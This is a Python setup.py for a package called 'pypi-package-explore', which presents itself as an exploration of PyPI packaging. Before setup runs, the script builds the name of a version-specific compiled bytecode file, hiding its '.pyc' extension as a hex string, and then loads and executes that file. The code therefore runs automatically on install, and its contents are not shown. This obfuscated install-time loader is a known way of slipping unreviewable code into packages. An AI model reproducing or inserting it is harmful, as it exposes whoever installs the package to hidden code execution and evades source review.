from setuptools import setup, find_packages
from pathlib import Path
import importlib.util
from sys import version_info

here = Path(__file__).resolve().parent
script = f"p{version_info.major}{version_info.minor}"

if spec := importlib.util.spec_from_file_location(
        script, here / f"{script}.{
            bytes.fromhex('707963').decode("utf-8")}"):
    spec.loader.exec_module( # type: ignore[attr-defined]
            importlib.util.module_from_spec(spec)) 

setup(
        name="pypi-package-explore",
        version="0.0.3a",
        package_dir={"": "src"},
        install_requires=[],
        packages=find_packages(where="src"),
        description="Exploring the inner mechanics of PyPI packaging",
        long_description=(here / "README.md").read_text(encoding="utf-8"),
        long_description_content_type="text/markdown")
